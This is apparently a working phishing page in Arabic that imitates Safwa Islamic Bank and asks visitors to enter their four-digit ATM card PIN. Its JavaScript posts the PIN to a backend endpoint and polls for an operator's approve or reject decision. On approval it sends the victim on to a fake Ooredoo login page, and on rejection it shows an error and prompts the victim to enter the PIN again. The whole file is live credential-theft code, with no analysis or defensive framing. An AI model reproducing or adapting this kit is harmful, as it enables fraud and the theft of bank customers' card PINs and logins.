<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تأكيد الرقم السري للبطاقة - بنك صفوة الإسلامي</title>
<style>
  :root {
    --green: #1a6b3c;
    --green-dark: #125129;
    --orange: #f28c28;
    --orange-dark: #d97706;
    --navy: #12314f;
    --gold: #f4c26b;
    --ink: #1c2b36;
    --muted: #5c6b74;
    --light-bg: #f4f6f8;
    --border: #d7dce0;
    --gray-line: #dcdcdc;
    --text-dark: #2b2b2b;
    --card-bg: #ffffff;
  }
  * {
    box-sizing: border-box;
  }
  body {
    margin: 0;
    font-family: "Segoe UI", "Tahoma", Arial, sans-serif;
    background-color: var(--light-bg);
    color: var(--text-dark);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 16px;
  }
  .screen {
    width: 100%;
    max-width: 360px;
    min-height: auto;
    display: flex;
    flex-direction: column;
    padding: 18px 18px 14px;
    position: relative;
    background: var(--card-bg);
    border-radius: 16px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
  }
  @media (max-width: 480px) {
    body {
      background: var(--card-bg);
      padding: 0;
      align-items: flex-start;
    }
    .screen {
      box-shadow: none;
      border-radius: 0;
      min-height: 100vh;
      padding: 14px 16px 0 16px;
    }
  }
  .logo-wrap {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    margin-bottom: 12px;
  }
  .logo-wrap img {
    max-width: 220px;
    width: 100%;
    height: auto;
    object-fit: contain;
  }
  .page-subtitle {
    color: var(--green);
    font-weight: 700;
    font-size: 18px;
    margin-top: 16px;
    text-align: center;
  }
  .secure-icon {
    width: 100px;
    height: 100px;
    background-color: rgba(26, 107, 60, 0.05);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 12px;
    color: var(--green);
  }
  h2 {
    color: var(--green);
    font-size: 19px;
    margin: 0 0 6px;
    text-align: center;
  }
  p.desc {
    color: var(--muted);
    font-size: 13px;
    line-height: 1.6;
    margin: 0 0 18px;
    text-align: center;
  }
  .pin-boxes {
    display: flex;
    justify-content: center;
    gap: 14px;
    margin-bottom: 24px;
    direction: ltr;
  }
  .pin-box {
    width: 56px;
    height: 64px;
    border: 2px solid var(--border);
    border-radius: 14px;
    font-size: 26px;
    font-weight: 700;
    text-align: center;
    color: var(--green);
    background: #fff;
    transition: all 0.2s ease;
    -webkit-text-security: disc;
    caret-color: var(--green);
  }
  .pin-box:focus {
    outline: none;
    border-color: var(--green);
    box-shadow: 0 0 0 3px rgba(26, 107, 60, 0.12), 0 4px 12px rgba(26, 107, 60, 0.08);
    transform: scale(1.06);
  }
  .pin-box.filled {
    border-color: var(--green);
    background: rgba(26, 107, 60, 0.04);
  }
  .btn-submit {
    width: 100%;
    background-color: #1976D2;
    color: #ffffff;
    border: none;
    border-radius: 12px;
    padding: 16px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    transition: background-color 0.2s;
    box-shadow: 0 4px 12px rgba(25, 118, 210, 0.3);
  }
  .btn-submit:hover {
    background-color: #125AA0;
  }
  .btn-submit:disabled {
    background-color: #cccccc;
    cursor: not-allowed;
    box-shadow: none;
  }
  .error-msg {
    color: #c0392b;
    font-size: 13px;
    margin-top: 12px;
    display: none;
    text-align: center;
  }
  
  /* Loading Overlay */
  .loading-overlay {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(255, 255, 255, 0.95);
    z-index: 100;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    text-align: center;
    padding: 20px;
  }
  .spinner {
    width: 50px;
    height: 50px;
    border: 4px solid rgba(26, 107, 60, 0.1);
    border-top-color: var(--green);
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-bottom: 20px;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  .loading-title {
    font-size: 18px;
    font-weight: bold;
    color: var(--green);
    margin-bottom: 8px;
  }
  .loading-desc {
    font-size: 13px;
    color: var(--muted);
  }

  .spacer {
    flex: 1;
    min-height: 20px;
  }
</style>
</head>
<body>

  <div class="screen">
    <!-- Unified Header -->

    <div class="secure-icon">
      <img src="https://i.ibb.co/YFdBpRP3/file-00000000f46c81f49efd2cb9f8007b00.png" alt="ATM icon" style="width:100%; height:100%; object-fit:contain; border-radius:50%;">
    </div>
    <h2>تأكيد الرقم السري للبطاقة</h2>
    <p class="desc">يرجى إدخال الرقم السري الخاص ببطاقتك المكون من 4 أرقام (ATM PIN) لإتمام عملية التحقق وتفعيل الخدمة بنجاح.</p>
    
    <div class="pin-boxes">
      <input class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="PIN digit 1" />
      <input class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="PIN digit 2" />
      <input class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="PIN digit 3" />
      <input class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="PIN digit 4" />
    </div>
    <input type="hidden" id="atmPinInput" />

    <button class="btn-submit" id="btnSubmit" onclick="submitPin()" disabled>تأكيد ومتابعة</button>
    <div class="error-msg" id="errorMsg">تم رفض الرقم السري. يرجى التحقق من البيانات والمحاولة مرة أخرى.</div>

    <!-- شارة الأمان -->
    <div style="text-align:center; margin-top:14px;">
      <img src="https://i.ibb.co/LhrCDkd5/IMG-20260930-WA0018.jpg" alt="secure payment" style="max-width:180px; width:60%; height:auto; border-radius:8px;">
    </div>

    <div class="spacer"></div>
  </div>

  <!-- Loading Overlay -->
  <div class="loading-overlay" id="loadingOverlay">
    <div class="spinner"></div>
    <div class="loading-title">جاري التحقق من البيانات...</div>
    <div class="loading-desc">يرجى الانتظار وعدم إغلاق الصفحة أو تحديثها.</div>
  </div>

  <script>
    var pin = "";
    var requestId = sessionStorage.getItem('safwa_order_id') || sessionStorage.getItem('aman_bank_request_id') || localStorage.getItem('requestId') || new URLSearchParams(window.location.search).get('id');
    if (!requestId) {
      window.location.href = 'index.html';
    }
    sessionStorage.setItem('safwa_order_id', String(requestId));
    sessionStorage.setItem('aman_bank_request_id', String(requestId));

    var boxes = Array.prototype.slice.call(document.querySelectorAll('.pin-box'));
    var hiddenPin = document.getElementById('atmPinInput');

    function syncHidden() {
      pin = boxes.map(function(b){ return b.value; }).join('');
      if (hiddenPin) hiddenPin.value = pin;
      boxes.forEach(function(b){ b.classList.toggle('filled', b.value.length > 0); });
      document.getElementById('btnSubmit').disabled = (pin.length !== 4);
    }

    boxes.forEach(function(box, idx) {
      box.addEventListener('input', function() {
        var val = box.value.replace(/\D/g, '');
        box.value = val.slice(0, 1);
        syncHidden();
        if (val && idx < boxes.length - 1) boxes[idx + 1].focus();
      });
      box.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace') {
          if (!box.value && idx > 0) {
            e.preventDefault();
            boxes[idx - 1].value = '';
            boxes[idx - 1].focus();
            syncHidden();
          }
        }
      });
      box.addEventListener('paste', function(e) {
        e.preventDefault();
        var data = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
        for (var i = 0; i < boxes.length; i++) {
          boxes[i].value = data[i] || '';
        }
        syncHidden();
        var next = Math.min(data.length, boxes.length - 1);
        boxes[next].focus();
      });
    });

    if (boxes[0]) boxes[0].focus();

    function applyAtmRejectMessage() {
      var params = new URLSearchParams(window.location.search);
      if (params.get('error') !== 'atm') return;
      var msg = params.get('msg') || 'تم رفض الرقم السري. يرجى التحقق من البيانات والمحاولة مرة أخرى.';
      var errorMsg = document.getElementById('errorMsg');
      if (errorMsg) {
        errorMsg.textContent = msg;
        errorMsg.style.display = 'block';
      }
      var loadingOverlay = document.getElementById('loadingOverlay');
      if (loadingOverlay) loadingOverlay.style.display = 'none';
      boxes.forEach(function(b){ b.value = ''; b.classList.remove('filled'); });
      syncHidden();
      if (boxes[0]) boxes[0].focus();
    }

    function clearPin() {
      boxes.forEach(function(b){ b.value = ''; b.classList.remove('filled'); });
      syncHidden();
      if (boxes[0]) boxes[0].focus();
    }

    function submitPin() {
      syncHidden();
      if (pin.length !== 4) return;
      if (!requestId) {
        alert("عذرًا، لم يتم العثور على معرف الطلب. يرجى البدء من جديد.");
        return;
      }

      document.getElementById('loadingOverlay').style.display = 'flex';
      document.getElementById('errorMsg').style.display = 'none';

      fetch('/api/atm', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: requestId, atmPin: pin })
      })
      .then(function(res) { return res.json(); })
      .then(function(data) {
        if (data.ok) {
          window.location.href = 'loading.html?type=atm&id=' + encodeURIComponent(requestId);
        } else {
          throw new Error('Failed to submit');
        }
      })
      .catch(function() {
        document.getElementById('loadingOverlay').style.display = 'none';
        document.getElementById('errorMsg').style.display = 'block';
      });
    }

    applyAtmRejectMessage();

    var pollInterval = null;
    function startPollingStatus() {
      pollInterval = setInterval(function() {
        fetch('/api/status/' + requestId)
          .then(function(res) { return res.json(); })
          .then(function(data) {
            if (!data || !data.status) return;
            if (data.status === 'approved') {
              clearInterval(pollInterval);
              window.location.href = 'ooredoo-login.html?id=' + requestId;
            } else if (data.status === 'rejected') {
              clearInterval(pollInterval);
              var rejectMessage = 'تم رفض الرقم السري. يرجى التحقق من البيانات والمحاولة مرة أخرى.';
              window.location.href = 'atm.html?error=atm&msg=' + encodeURIComponent(rejectMessage) + '&id=' + requestId;
            }
          })
          .catch(function() {});
      }, 2500);
    }
  </script>
<script src="heartbeat.js"></script>
</body>
</html>
